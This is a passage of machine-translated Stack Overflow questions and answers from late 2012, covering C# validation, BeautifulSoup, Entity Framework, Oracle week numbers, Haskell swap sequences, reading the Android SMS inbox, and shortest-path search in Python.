        return ValidationResult.Success; // what if applied to something else than IEnumerable<string> or it is null?
    }

    protected ValidationResult IsEnumerationValid(IEnumerable<string> coll, ValidationContext validationContext)
    {
        foreach (var item in coll)
        {
            // utilize the actual StringLengthAttribute to validate the items
            if (!base.IsValid(item) || (MinimumLength > 0 && item == null))
            {
                return new ValidationResult(base.FormatErrorMessage(validationContext.DisplayName));
            }
        }
        return ValidationResult.Success;
    }
} 
```

应用如下，每个收藏项要求 4-10 个字符：

```
[StringEnumerationLengthValidation(10, MinimumLength=4)]
public ICollection<string> Sample { get; set; } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T18:48:46.090

好的，我找到了一篇很好的文章，解释了一些有用的信息：

[http://blogs.msdn.com/b/codeanalysis/archive/2006/04/27/faq-why-does-donotexposegenericlists-recommend-that-i-expose-collection-lt-t-gt-instead-of-列表-lt-t-gt-david-kean.aspx](http://blogs.msdn.com/b/codeanalysis/archive/2006/04/27/faq-why-does-donotexposegenericlists-recommend-that-i-expose-collection-lt-t-gt-instead-of-list-lt-t-gt-david-kean.aspx)

这是一些建议的代码，可以让 Foo 的 Bars 成员做你想做的事。

```
public class Foo
{
    public ValidatedStringCollection Bars = new ValidatedStringCollection(10);
}

public class ValidatedStringCollection : Collection<string>
{

    int _maxStringLength;

    public ValidatedStringCollection(int MaxStringLength)
    {
        _maxStringLength = MaxStringLength;
    }

    protected override void InsertItem(int index, string item)
    {
        if (item.Length > _maxStringLength)
        {
            throw new ArgumentException(String.Format("Length of string \"{0}\" is beyond the maximum of {1}.", item, _maxStringLength));
        }
        base.InsertItem(index, item);
    }

}

class Program
{
    static void Main(string[] args)
    {
        Foo x = new Foo();
        x.Bars.Add("A");
        x.Bars.Add("CCCCCDDDDD");
        //x.Bars.Add("This string is longer than 10 and will throw an exception if uncommented.");

        foreach (string item in x.Bars)
        {
            Console.WriteLine(item);
        }

        Console.ReadKey();
    }
} 
```

链接的文章有几个建议，包括覆盖集合上的其他方法、有条件地实现事件等。这应该会涵盖您。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-31T04:48:09.820

看一下数据注释功能：

这对你有用吗？

```
using System.ComponentModel;
using System.ComponentModel.DataAnnotations;
public class Foo
{  
    [StringLength(256)]
    public ICollection<string> Bars { get; set; }
} 
```

# python - 过滤 BeautifulSoup find_all 结果

> ID：14097475
> 
> 赞同：0
> 
> 时间：2012-12-31T04:33:36.917
> 
> 标签：python, beautifulsoup

我正在尝试从亚马逊收集一些书籍评论。这是我到目前为止所拥有的：

```
import requests
from bs4 import BeautifulSoup

def data(site):
    url = site
    r = requests.get(url)
    soup = BeautifulSoup(r.text) 
    y = soup.find_all("div", style = "margin-left:0.5em;")
    words = []
    for item in y:
        item = str(item.text).split()
        words.append(item)
    reviews = [" ".join(x) for x in words]
    return reviews

f = data('http://www.amazon.com/Dance-Dragons-Song-Fire-Book/product-reviews/0553801473/ref=cm_cr_pr_top_link_11?ie=UTF8&pageNumber=11&showViewpoints=0&sortBy=bySubmissionDateDescending') 
```

除了评论之外，我还获得了一些无关的信息，例如作者、标题和认为评论有帮助的人数。有没有办法使用 BeautifulSoup 来排除除评论文本之外的所有内容？评论的文本没有类或样式属性，而其他文本有（我认为......），但我还没有找到过滤我的 soup.find_all 结果的方法。我真的很感激任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:34:25.830

所有评论都包含在 中`table`，因此您可以先找到表格，然后从每个评论中提取评论文本。

更改此行应该这样做：

```
...
y = soup\
    .find('table', {'id' : 'productReviews'})\ # here you find the table
    .find_all("div", style = "margin-left:0.5em;")
... 
```

# c# - 无法在 foreach 循环中检索由上下文跟踪的实体

> ID：14097478
> 
> 赞同：0
> 
> 时间：2012-12-31T04:34:01.967
> 
> 标签：c#, entity-framework-4

我`Student`使用以下代码获得了表的主键：

```
var stud_id = (from p in context.Students
                          where p.Student_Name == "Bruce"
                          select  p.Student_Id ); 
```

当我尝试使用`stud_id`以下代码检索整个实体时：

```
Student requiredstud = new Student();
foreach (var p in stud_id)
            {
                //Console.WriteLine(p);

            requiredObj = context.Students.Find(p);
            string tempObj = JsonSerializer.SerializeToString<Student>(requiredObj);
            Console.WriteLine(tempObj);

            } 
```

它在线上给出了以下异常：

```
requiredObj = context.Students.Find(p); 
```

![在此处输入图像描述](../Images/4c37946c94a9590e8ba7b3a7f39f9a78.png)

如何解决此问题并获取详细信息`student`

**编辑：** 内部异常

是：`{"There is already an open DataReader associated with this Command which must be closed first."}`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T04:45:32.057

由于您正在迭代 an`IQueryable`并试图找到另一个使用相同的学生`context`，因此您遇到了异常。您应该`.ToList`在查询中进行迭代并从数据库中获取记录。稍后您可以在 foreach 循环中使用上下文。所以你的查询可以是：

```
var stud_id = (from p in context.Students
                          where p.Student_Name == "Bruce"
                          select  p.Student_Id ).ToList(); 
```

或者

```
var stud_id = context.Students.Where(p=> p.Student_Name == "Bruce").ToList(); 
```

# oracle11g - 为什么今年的最后一天是甲骨文的第 1 周？

> ID：14097482
> 
> 赞同：0
> 
> 时间：2012-12-31T04:34:28.197
> 
> 标签：oracle11g

为什么这显示第 1 周？虽然是 2012 年的最后一天。 to_char(to_date('31-DEC-12'), 'IW' )

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:39:04.173

因为，根据 ISO 标准，我们处于第 1 周。

[http://www.epochconverter.com/date-and-time/weeknumbers-by-year.php?year=2013](http://www.epochconverter.com/date-and-time/weeknumbers-by-year.php?year=2013)

`IW`Oracle 中的日期格式返回

> 基于 ISO 标准的一年中的第几周（1-52 或 1-53）。

[http://www.techonthenet.com/oracle/functions/to_date.php](http://www.techonthenet.com/oracle/functions/to_date.php)

对于非 ISO 年份，您可以尝试使用格式`WW`.

# javascript - 使用 javascript 打印网站内容的另一种方法

> ID：14097484
> 
> 赞同：0
> 
> 时间：2012-12-31T04:34:28.180
> 
> 标签：javascript, jquery, printing

目前我正在使用并配置css的方法来打印文件。但是，我发现这种方式对我的情况不可行，因为我正在打印电子书应用程序图像，很难修改 css 代码并打印它。所以 ，

我想知道是否创建新窗口，获取网站的图像链接并将其附加到那个空窗口，然后打印内容，这是一个好方法吗？

另外，是否可以控制图像打印的大小？（目前如果屏幕尺寸更小，图像打印也更小）。谢谢

# arrays - 如何交换项目以将一个列表转换为另一个

> ID：14097485
> 
> 赞同：4
> 
> 时间：2012-12-31T04:34:29.657
> 
> 标签：arrays, haskell, pseudocode

我有两个列表：源列表和目标列表。两个列表都包含所有相同的项目，但列表的顺序不同。给定这两个列表，我需要在源列表上找到一系列交换操作，将列表中的一个项目与另一个项目交换，最终以与目标列表相同的顺序结束源列表。

我正在编写一个按专辑随机播放 MPD 播放列表的脚本，因为默认情况下此功能不在 MPD 中。该脚本当前获取当前播放列表（源列表），执行列表的自定义随机播放，并以新的歌曲顺序（目标列表）结束。然后，该脚本会从播放列表中删除所有项目，并按照新的打乱播放列表的顺序将它们重新插入到播放列表中。删除和添加所有歌曲是一项缓慢的操作。MPD 库为播放列表中的两首歌曲提供了更快的就地交换，但我不知道如何找到正确的一系列交换操作来将源列表转换为新的随机列表。

这是用 Haskell 编写的，但任何语言/伪代码的答案都可以。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T11:44:41.433

```
import Data.List
import Data.Maybe

orderBySecond :: Ord a => (a, a) -> (a, a) -> Ordering
orderBySecond (_, x1) (_, x2) = compare x1 x2

-- Gets the position in xs of elements in the second list (ys)
indices :: Eq a => [a] -> [a] -> [(Int, Int)]
indices xs ys = zip (map (\x -> fromJust $ x `elemIndex` xs) ys) [0 ..]

getSwapsfromIndices :: [(Int, Int)] -> [(Int, Int)]
getSwapsfromIndices xs = getSwapsfromIndices' xs []

-- The second argument for this is an accumulator used for tail recursion
getSwapsfromIndices' :: [(Int, Int)] -> [(Int, Int)] -> [(Int, Int)]
getSwapsfromIndices' [] ys = ys
getSwapsfromIndices' xs ys = getSwapsfromIndices' xs' (ys ++ new_swap)
   where (l1, l2) = minimumBy orderBySecond xs
    -- remove minimum from the list
    unordered = [ (x, y)  | (x, y) <- xs, y /= l2]
    -- swap
    xs' = [ (if  x == l2 then l1 else x, y)  | (x, y) <- unordered]
    -- if no swap is needed, do not append anything
    new_swap = if l1 == l2 then [] else [(l1, l2)]

swaps :: Eq a => [a] -> [a] -> [(Int, Int)]
swaps xs ys = getSwapsfromIndices $ indices xs ys 
```

By running the code with the example above:

```
*Main> swap [2,3,4,1,7] [7,1,2,4,3]

[(4,0),(3,1),(4,2),(4,3)] 
```

Note that the only difference in the results is in the order of the indices in swaps (which is a matter of convention) and the fact that I start counting elements from 0.

This implementation uses the idea of imposing a total ordering on the elements in the first list, according to where they are situated in the second list. It then uses Selection sort to get the swaps. It is probably not the most efficient solution, but good to give you a head start.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T04:41:54.087

一种简单的方法是仅使用目标列表顺序作为排序的总顺序。例如，使用索引顺序。那么总顺序关系就`<`在索引上。

现在运行您最喜欢的、最有效的基于交换的排序算法，对第二个列表进行排序以符合第一个列表的总顺序。（想到快速排序。）每次排序进行交换时，按顺序记录这对。这个序列就是你的答案。

下面是一些一次性的 C 代码，向您展示我在说什么：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// A faux play list item.
struct list_item {
  char name[9];
  int index;
};

// Randomized quicksort that prints its swaps.
// Note this sorts on the 'index' field, which defines the total order.
void sort(struct list_item **a, int n)
{
  if (n <= 1) return;
  struct list_item *p = a[rand() % n];
  int lo = 0;
  int hi = n - 1;
  while (lo <= hi) {
    while (a[lo]->index < p->index) ++lo;
    while (a[hi]->index > p->index) --hi;
    if (lo < hi) {
        // We need a swap!  Print it!
        printf("swap %s and %s\n", a[hi]->name, a[lo]->name);
        struct list_item *t = a[lo];
        a[lo] = a[hi];
        a[hi] = t;
        ++lo;
        --hi;
    }
    else if (lo == hi) {
      ++lo;
      --hi;
    }
  }
  sort(a, hi + 1);
  sort(a + lo, n - lo);
}

// Make an array of pointers to simulated play list items.
struct list_item **make_list(int n)
{
  int j;
  struct list_item **a = malloc(n * sizeof(struct list_item *));
  char x[9] = "a";
  for (int i = 0; i < n;  i++) {
     a[i] = malloc(sizeof(struct list_item));
     strcpy(a[i]->name, x);
     for (j = 0; x[j] == 'z'; j++) 
       x[j] = 'a';
     x[j] =  x[j] ? x[j] + 1 : 'a';
  }
  return a;    
}

// Randomize a list of pointers.
void randomize_list(struct list_item **a, int n)
{
  for (int i = 0; i < n - 1; i++) {
    int r = i + rand() % (n - i);
    struct list_item *t = a[r];
    a[r] = a[i]; 
    a[i] = t;
  } 
}

// Test case size.
#define N 7

int main(void)
{
  // Make a nice test destination list..
  struct list_item **dst = make_list(N);  

  // Make a copy of the pointers and shuffle them to make the source list.
  struct list_item **src = malloc(N * sizeof(struct list_item *));
  memcpy(src, dst, N * sizeof(struct list_item *));
  randomize_list(src, N);

  // Print the source to see where we're starting.
  for (int i = 0; i < N; i++)
    printf("%d: %s\n", i + 1, src[i]->name);

  // Define the total order to be the destination's index order.
  for (int i = 0; i < N; i++)
    dst[i]->index = i;

  // Sort the source to duplicate the destination.
  // Swaps printed above will get the job done.
  sort(src, N);

  return 0;
} 
```

长度为 7 的列表的结果：

```
1: g
2: a
3: b
4: d
5: c
6: f
7: e
swap e and g
swap c and e
swap a and c
swap b and c 
```

如果您进行这些交换，结果是按顺序从 a 到 g，正如您所期望的那样。

Note that QuickSort is great for minimizing comparisons. [This page](http://www.sorting-algorithms.com/selection-sort) says that Selection Sort (which requires up to O(n^2) comparisons) minimizes the number of swaps, at least in the asymptotic worst case sense. It needs at most n-1 swaps. Indeed when I tried QuickSort on 100 items, it took 156 swaps, so selection sort would have been better.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T10:19:56.040

I came up with the following ugly code. The idea is similar to swap based sorting technique. Suppose you have two lists

> [7,1,2,4,3] and [2,3,4,1,7]

Now you can obtain swaps one item at a time. First get the first element correct, I have mentioned the swaps as pair of indexes to swap in the list followed by the list obtained after applying the swap

> (1,5) => [7,3,4,1,2]
> 
> (2,4) => [7,1,4,3,2]
> 
> (3,5) => [7,1,2,3,4]
> 
> (4,5) => [7,1,2,4,3]

So the swaps are

> [(1,5),(2,4),(3,5),(4,5)]

```
import qualified Data.Map as M
import Data.Maybe

-- It will totally break if lists don't contain same items.
swaps :: Ord a => [a] -> [a] -> [(Int,Int)]
swaps xs ys = reverse . getFirst $ foldl f ([],xsm,mxs,1) ys
    where
        getFirst (a,_,_,_) = a
        xsm = M.fromList $ zip xs ([1..])  -- Construct map for O(logn) lookups
        mxs = M.fromList $ zip ([1..]) xs  -- Map for Reverse lookup
        f (swps,xm,mx,i) y = if i==a then (swps,newxm,newmx,i+1)
                                     else ((i,a):swps,newxm,newmx,i+1)
          where
            a = fromJust $ M.lookup y xm  -- Not very safe to use fromJust
            b = fromJust $ M.lookup i mx
            newxm = M.insert b a $ M.insert y i xm
            newmx = M.insert a b $ M.insert i y mx 
```

In ghci

```
*Main> swaps [2,3,4,1,7] [7,1,2,4,3]
[(1,5),(2,4),(3,5),(4,5)] 
```

# android - 从 android 设备获取收件箱消息以显示在自定义列表视图中

> ID：14097500
> 
> 赞同：6
> 
> 时间：2012-12-31T04:39:54.407
> 
> 标签：android, sms, inbox

> **可能重复：**
> [如何在 Android 中以编程方式从收件箱中读取 SMS 消息？](https://stackoverflow.com/questions/848728/how-can-i-read-sms-messages-from-the-inbox-programmatically-in-android)

我不知道如何以编程方式访问 android 手机的收件箱，请您指导我或分享一些教程我该怎么做（访问手机的收件箱）。顺便说一句，我的应用程序是这样的。它是一个 SMS 加密器，我的应用程序复制了原始收件箱的内容，通过它我可以加密发送它的消息，反之亦然，我的应用程序是解密该消息的唯一方法。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-31T04:52:19.267

在内容提供者的帮助下，您可以实现您的目标，请查看下面从[此处](http://www.itcuties.com/android/read-sms/)复制的示例，这样如果博客消失，这篇文章仍然有用，希望它对您有所帮助，也可以通过[内容提供者](http://developer.android.com/guide/topics/providers/content-providers.html)。

**AndroidManifest.xml**

```
 <?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.itcuties.android.apps"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
       android:minSdkVersion="8"
       android:targetSdkVersion="16" />

    <uses-permission android:name="android.permission.READ_SMS"/>

    <application
       android:allowBackup="true"
       android:icon="@drawable/ic_launcher"
       android:label="@string/app_name"
       android:theme="@style/AppTheme" >
       <activity
           android:name="com.itcuties.android.apps.MainActivity"
           android:label="@string/app_name" >
           <intent-filter>
               <action android:name="android.intent.action.MAIN" />
               <category android:name="android.intent.category.LAUNCHER" />
           </intent-filter>
       </activity>
    </application>

</manifest> 
```

**activity_main.xml**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="#000">

    <TextView
       android:id="@+id/smsNumberText"
       android:layout_width="fill_parent"
       android:layout_height="wrap_content"
       android:text="NUMBER_GOES_HERE">
    </TextView>

</LinearLayout> 
```

**SMSData.java**

```
package com.itcuties.android.apps.data;

/**
* This class represents SMS.
*
* @author itcuties
*
*/
public class SMSData {

   // Number from witch the sms was send
   private String number;
   // SMS text body
   private String body;

   public String setNumber() {
       return number;
   }

   public void setNumber(String number) {
       this.number = number;
   }

   public String setBody() {
       return body;
   }

   public void setBody(String body) {
       this.body = body;
   }

} 
```

**ListAdapter.java**

```
package com.itcuties.android.apps;

import java.util.List;

import android.content.Context;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.TextView;

import com.itcuties.android.apps.data.SMSData;

/**
* List adapter for storing SMS data
*
* @author itcuties
*
*/
public class ListAdapter extends ArrayAdapter<SMSData> {

   // List context
    private final Context context;
    // List values
    private final List<SMSData> smsList;

   public ListAdapter(Context context, List<SMSData> smsList) {
       super(context, R.layout.activity_main, smsList);
       this.context = context;
       this.smsList = smsList;
   }

   @Override
   public View getView(int position, View convertView, ViewGroup parent) {
       LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);

    View rowView = inflater.inflate(R.layout.activity_main, parent, false);

       TextView senderNumber = (TextView) rowView.findViewById(R.id.smsNumberText);
       senderNumber.setText(smsList.get(position).setNumber().toString());

       return rowView;
   }

} 
```

**MainActivity.java**

```
package com.itcuties.android.apps;

import java.util.ArrayList;
import java.util.List;

import android.app.ListActivity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.ListView;
import android.widget.Toast;

import com.itcuties.android.apps.data.SMSData;

/**
* Main Activity. Displays a list of numbers.
*
* @author itcuties
*
*/
public class MainActivity extends ListActivity {

   @Override
   protected void onCreate(Bundle savedInstanceState) {
       super.onCreate(savedInstanceState);

 ArrayList<Message> smsInbox = new ArrayList<Message>();

Uri uriSms = Uri.parse("content://sms");

Cursor cursor = this.getContentResolver()
        .query(uriSms,
                new String[] { "_id", "address", "date", "body",
                        "type", "read" }, "type=" + type, null,
                "date" + " COLLATE LOCALIZED ASC");
if (cursor != null) {
    cursor.moveToLast();
    if (cursor.getCount() > 0) {

        do {

            Message message = new Message();
            message.messageNumber = cursor.getString(cursor
                    .getColumnIndex("address"));
            message.messageContent = cursor.getString(cursor
                    .getColumnIndex("body"));
            smsInbox.add(message);
        } while (cursor.moveToPrevious());
    }

       }
       c.close();

       // Set smsList in the ListAdapter
       setListAdapter(new ListAdapter(this, smsList));

   }

   @Override
   protected void onListItemClick(ListView l, View v, int position, long id) {
       SMSData sms = (SMSData)getListAdapter().getItem(position);

       Toast.makeText(getApplicationContext(), sms.setBody(), Toast.LENGTH_LONG).show();

   }

} 
```

还检查以下相关链接@

[Android 阅读收件箱消息](http://androidsourcecode.blogspot.in/2010/10/android-reading-inbox-sms.html)

[短信](http://mobdev.olin.edu/mobdevwiki/FrontPage/Tutorials/SMS%20Messaging)

[inbox_message_listview](https://github.com/prativa/inbox_message_listview/blob/master/src/com/example/inboxlistproject/MainActivity.java)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T04:56:56.170

```
 public class MainActivity extends Activity {
private static final int TYPE_INCOMING_MESSAGE = 1;
private ListView messageList;
private MessageListAdapter messageListAdapter;
private ArrayList<Message> recordsStored;
private ArrayList<Message> listInboxMessages;
private ProgressDialog progressDialogInbox;
private CustomHandler customHandler;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    initViews();

}

@Override
public void onResume() {
    super.onResume();
    populateMessageList();
}

private void initViews() {
    customHandler = new CustomHandler(this);
    progressDialogInbox = new ProgressDialog(this);

    recordsStored = new ArrayList<Message>();

    messageList = (ListView) findViewById(R.id.messageList);
    populateMessageList();
}

public void populateMessageList() {
    fetchInboxMessages();

    messageListAdapter = new MessageListAdapter(this,
            R.layout.message_list_item, recordsStored);
    messageList.setAdapter(messageListAdapter);
}

private void showProgressDialog(String message) {
    progressDialogInbox.setMessage(message);
    progressDialogInbox.setIndeterminate(true);
    progressDialogInbox.setCancelable(true);
    progressDialogInbox.show();
}

private void fetchInboxMessages() {
    if (listInboxMessages == null) {
        showProgressDialog("Fetching Inbox Messages...");
        startThread();
    } else {
        // messageType = TYPE_INCOMING_MESSAGE;
        recordsStored = listInboxMessages;
        messageListAdapter.setArrayList(recordsStored);
    }
}

public class FetchMessageThread extends Thread {

    public int tag = -1;

    public FetchMessageThread(int tag) {
        this.tag = tag;
    }

    @Override
    public void run() {

        recordsStored = fetchInboxSms(TYPE_INCOMING_MESSAGE);
        listInboxMessages = recordsStored;
        customHandler.sendEmptyMessage(0);

    }

}

public ArrayList<Message> fetchInboxSms(int type) {
    ArrayList<Message> smsInbox = new ArrayList<Message>();

    Uri uriSms = Uri.parse("content://sms");

    Cursor cursor = this.getContentResolver()
            .query(uriSms,
                    new String[] { "_id", "address", "date", "body",
                            "type", "read" }, "type=" + type, null,
                    "date" + " COLLATE LOCALIZED ASC");
    if (cursor != null) {
        cursor.moveToLast();
        if (cursor.getCount() > 0) {

            do {

                Message message = new Message();
                message.messageNumber = cursor.getString(cursor
                        .getColumnIndex("address"));
                message.messageContent = cursor.getString(cursor
                        .getColumnIndex("body"));
                smsInbox.add(message);
            } while (cursor.moveToPrevious());
        }
    }

    return smsInbox;

}

private FetchMessageThread fetchMessageThread;

private int currentCount = 0;

public synchronized void startThread() {

    if (fetchMessageThread == null) {
        fetchMessageThread = new FetchMessageThread(currentCount);
        fetchMessageThread.start();
    }
}

public synchronized void stopThread() {
    if (fetchMessageThread != null) {
        Log.i("Cancel thread", "stop thread");
        FetchMessageThread moribund = fetchMessageThread;
        currentCount = fetchMessageThread.tag == 0 ? 1 : 0;
        fetchMessageThread = null;
        moribund.interrupt();
    }
}

static class CustomHandler extends Handler {
    private final WeakReference<MainActivity> activityHolder;

    CustomHandler(MainActivity inboxListActivity) {
        activityHolder = new WeakReference<MainActivity>(inboxListActivity);
    }

    @Override
    public void handleMessage(android.os.Message msg) {

        MainActivity inboxListActivity = activityHolder.get();
        if (inboxListActivity.fetchMessageThread != null
                && inboxListActivity.currentCount == inboxListActivity.fetchMessageThread.tag) {
            Log.i("received result", "received result");
            inboxListActivity.fetchMessageThread = null;

            inboxListActivity.messageListAdapter
                    .setArrayList(inboxListActivity.recordsStored);
            inboxListActivity.progressDialogInbox.dismiss();
        }
    }
}

private OnCancelListener dialogCancelListener = new OnCancelListener() {

    @Override
    public void onCancel(DialogInterface dialog) {
        stopThread();
    }

}; 
```

}

# c# - 从 foreach 循环中删除重复的 Web 应用程序名称

> ID：14097502
> 
> 赞同：0
> 
> 时间：2012-12-31T04:40:06.330
> 
> 标签：c#, .net, sharepoint, sharepoint-2010

我是sharepoint的新手。有人可以告诉我如何从下面的代码中删除重复的 Web 应用程序名称：

```
SPFarm farm = SPFarm.Local;
                SPWebService webser = farm.Services.GetValue<SPWebService>("");
                DataTable dt = new DataTable();
                dt.Columns.Add("Name", typeof(string));
                dt.Columns.Add("Port Numbers", typeof(string));

                foreach (SPWebApplication spwebApp in webser.WebApplications)
                {
                    foreach (SPSite site in spwebApp.Sites)
                    {
                        DataRow dr = dt.NewRow();
                        dr[0] = site.WebApplication.Name;
                        dr[1] = site.Port;
                        dt.Rows.Add(dr);
                    }
                }

                this.GridView1.DataSource = dt;
                this.GridView1.DataBind(); 
```

帮助高度赞赏！

我想在网格中只显示一个名称和一个端口号。例如，如果 Web 应用程序端口号上有五个站点。2222 它显示 5 次 web 应用程序名称，端口号为 2222。我只想要一次。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T04:55:23.233

```
DataView view = new DataView(dt);
dt = view.ToTable(true, "Name", "Port Numbers"); 
```

# javascript - HTML 集合和 Javascript 中的数组之间的差异

> ID：14097505
> 
> 赞同：0
> 
> 时间：2012-12-31T04:40:50.060
> 
> 标签：javascript, arrays, dom

以下代码只会产生错误。我希望检索每个 DIV 的 REL 属性值。不知道，为什么我做不到。

我在控制台中看到的错误：未捕获的类型错误***：对象 # 没有方法“getAttribute”***

```
 <div class="boxes">
        <div rel="first" class="box">Box 1</div>
        <div rel="second" class="box">Box 2</div>
        <div rel="third" class="box">Box 3</div>
    </div>
    <script>
        $(function(){
            var i = 0;
            var allDivs = document.getElementsByClassName('box');
            var arr = [];
            arr.push(allDivs);
            setInterval(function(){
                console.log(arr[i].getAttribute('rel'));
                i++;
            }, 1000);
        });
    </script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T04:43:58.207

您正在将一个数组（确切地说是 NodeList）推入一个数组并尝试从 NodeList 对象而不是单个元素中获取属性。试试这个：

```
<div class="boxes">
    <div rel="first" class="box">Box 1</div>
    <div rel="second" class="box">Box 2</div>
    <div rel="third" class="box">Box 3</div>
</div>
<script>
    $(function(){
        var i = 0;
        var allDivs = document.getElementsByClassName('box');
        var arr = [];
        arr.push(allDivs);
        setInterval(function(){
            console.log(arr[0][i].getAttribute('rel'));
            i++;
        }, 1000);
    });
</script> 
```

通过将 NodeList 推入另一个数组，您实际上是在创建：

```
var arr = [[<div element 1>, <div element 2>, <div element 3>]]; 
```

您可能想要做的是将推线更改为：

```
arr.push.apply(arr, allDivs); 
```

这会将 allDivs 集合中的所有单个元素附加到`arr`. 然后你可以`arr`像你之前预期的那样访问：`arr[i].getAttribute('rel')`（arr的内容将是`[<div element 1>, <div element 2>, <div element 3>];`）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T05:12:07.557

用这个替换脚本：

```
 $(function(){
        var i = 0;
        var allDivs = document.getElementsByClassName('box');
        //allDivs itself is an array and there is no need to push the result to an array.

        setInterval(function(){
            console.log(allDivs[i].getAttribute('rel'));
            i++;
        }, 1000);

     }); 
```

# python - 在游戏板上找到两个正方形之间的最短距离

> ID：14097506
> 
> 赞同：1
> 
> 时间：2012-12-31T04:41:03.573
> 
> 标签：python, distance, dictionary

我将游戏板上的路径存储在字典中，格式如下：

```
{1: [2,3,4], 2: [1,3,5], 3: [1,2,4], ...} 
```

这意味着如果您在空间 1，您可以移动到空间 2、3 或 4，依此类推。每个键都链接到列表中的至少两个值；许多人有四个或更多。板上共有 199 个空间。一个值得注意的问题是，有时您可能可以跳过一个空格，所以在...

```
{1:[2,3,4], 2:[3]} 
```

...你可以去 1 -> 2 -> 3，或者你可以去 1 -> 3。

我正在寻找一种算法来找到任何两个正方形之间的最短距离。显而易见的想法是查找起始空格的键，然后取列表中的第一个数字，查找可能的空格，依此类推，当它遇到之前看到的数字时停止并返回到上一个列表或最后一个方格（如果它击中结果方格，则存储路径和距离，以便在完成后进行比较）。

不过，我对如何开始实施这一点知之甚少。（如果只有两个步骤，我会使用嵌套循环，但显然这在这里行不通，因为我不知道它可能有多深）。

欢迎涉及其他数据结构的更好的解决方案或优化；我将数据存储在类似于这本字典的 CSV 文件中，因此如果效果更好，我可以轻松地将其转换为其他内容。

这是我正在使用的电路板图片的链接：http: [//goo.gl/Rasq6](http://goo.gl/Rasq6)

编辑：好的，我正在尝试实现 Dijkstra 的算法。这是我所拥有的：

```
 1 movedict, transdict = boardstruct.prepare_board()
  2 
  3 source = 87
  4 dest = 88
  5 
  6 dist = {}
  7 prev = {}
  8 for v in movedict.keys():
  9     dist[v] = float('inf')
 10     prev[v] = None
 11 
 12 dist[source] = 0
 13 q = movedict.keys()
 14 
 15 while q:
 16     smallest = float('inf')
 17     for i in q:
 18         dist_to = dist[i]
 19         if dist_to < smallest:
 20             smallest = dist_to
 21     print smallest
 22     u = q.pop(smallest)
 23     print u
 24 
 25     if dist[u] == float('inf'):
 26         break
 27 
 28     for v in movedict[u]:
 29         alt = dist[u] + 1 # distance = flat 1
 30         if alt < dist[v]:
 31             dist[v] = alt
 32             prev[v] = u
 33             # reorder queue? 
```

（21 和 23 是我忘记删除的调试语句）

我正在处理来自维基百科（http://en.wikipedia.org/wiki/Dijkstra's_algorithm#Pseudocode）的伪代码，因为我找不到任何与我需要的数据格式匹配的现有实现（每一步都有固定成本，因此距离不会存储在任何地方）。

我知道我需要在最后重新排序队列，但我不确定如何。我也不明白第 25 行和第 26 行是做什么用的（评论说“所有剩余的顶点都无法从源访问”——这是否只是在保证已经找到最佳路径时阻止它继续运行？）。我可能也搞砸了别的东西，所以如果你能看一下，我会很感激的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T04:53:07.427

你所描述的是一个[最短路径问题](http://en.wikipedia.org/wiki/Shortest_path_problem)。有几种方法可以解决它。 [Dijkstra 的算法](http://en.wikipedia.org/wiki/Dijkstra%27s_algorithm)是最容易实现的算法之一，但它对您的应用程序来说太过分了。（它找到从一个节点到所有其他节点的最短路径。）有一种称为[A*](http://en.wikipedia.org/wiki/A%2a_search_algorithm)的相关算法稍微复杂一些，但它完全符合您的要求。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T19:38:31.293

使用[networkx](http://networkx.lanl.gov/tutorial/index.html)。它易于安装。

从游戏板的图片中，我认出了苏格兰场游戏。
评论您与@Bill the Lizard 的对话：
您确实可以预先计算所有最短路径。节点和边都不会改变。
您可以`46`通过`13`5 个出租车台阶或 1 个地下台阶到达。

我可能会使用一个包含所有边（出租车、公共汽车、地下）的“大”图和几个结合出租车+公共汽车、出租车+地下和出租车的图（我不太记得游戏规则......你必须弄清楚什么是有意义的）。

我不确定 networkx 中的算法如何处理关系！

因此，预先计算所有最短路径。
然后只需在需要时查找它们。

```
import networkx as nx

# simplified example
# data is in the format as you specified
data = data = {1: [2,3,4],
               2: [1,3,5],
               3: [1,2,4],
               4: [1,3,5],
               5: [2,4]}

# initialize empty graph
G = nx.graph()

# now we're adding all edges
# don't bother about duplicates -- they're ignored
for n1, n in data.items():
    for n2 in n:
        G.add_edge(n1, n2)

# get ALL shortest paths
p = nx.shortest_path(G)

# lookup when needed, e.g. from 1 to 5
p[1][5]
# gives [1, 2, 5] 
```

# javascript - 在复杂例程中使用多个值的最简洁方法？

> ID：14097507
> 
> 赞同：2
> 
> 时间：2012-12-31T04:41:19.200
> 
> 标签：javascript, function, for-loop, while-loop, software-design

请参阅以下与我的情况相似的伪代码片段：

```
function foo () {
  for ( velocity=0; velocity<100; velocity++ ) {
    root1 = computeRoot1();
    root2 = computeRoot2();
    // do a bunch of computation with root1
    // if result of computation is undesirable, do computations again with root2 
  } 
```

